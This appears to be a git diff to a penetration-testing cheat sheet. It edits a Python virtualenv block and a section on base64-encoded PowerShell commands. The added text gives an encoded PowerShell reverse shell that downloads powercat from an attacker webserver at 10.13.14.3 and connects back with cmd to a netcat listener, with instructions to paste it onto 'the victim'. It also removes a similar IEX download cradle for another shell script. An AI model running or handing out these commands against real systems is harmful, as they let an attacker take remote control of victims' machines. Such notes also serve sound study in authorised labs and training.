@@ -92,12 +92,10 @@ grep -iR "pass" * | more
 ```sh
 mkdir environment
 cd environment
-
 python3 -m venv my_env
 source my_env/bin/activate
 
 # Alternative:
-
 virtualenv my_env
 source my_env/bin/activate
 ```
@@ -147,19 +145,22 @@ socat -v tcp4-listen:8000,reuseaddr,fork tcp4:10.10.12.15:80
 ### Encoded commands
 
 ```powershell
-$command="ping -c 3 10.10.10.10"
+$command="ping -n 3 10.10.10.10"
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
 powershell.exe -encoded $Encoded
 ```
-Reverse Shell
+Reverse Shell with powercat
+
+This downloads powercat from your webserver on port 9000 and calls back to you local listener (nc -nvlp 1234) 
 
 ```powershell
 $command={IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.14.3:9000/powercat.ps1'); powercat -c 10.13.14.3 -p 1234 -e cmd}
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
+```
+The command can be prepared locally and copy/pasted to the victim, the just run:
 
-$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.13.14.3:9000/Invoke-PowerShellTcpRun.ps1")'
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-$encodedCommand = [Convert]::ToBase64String($bytes)
+```
+powershell.exe -encoded <base64 string from $Encoded above here>
 ```
 
 Port Scanning
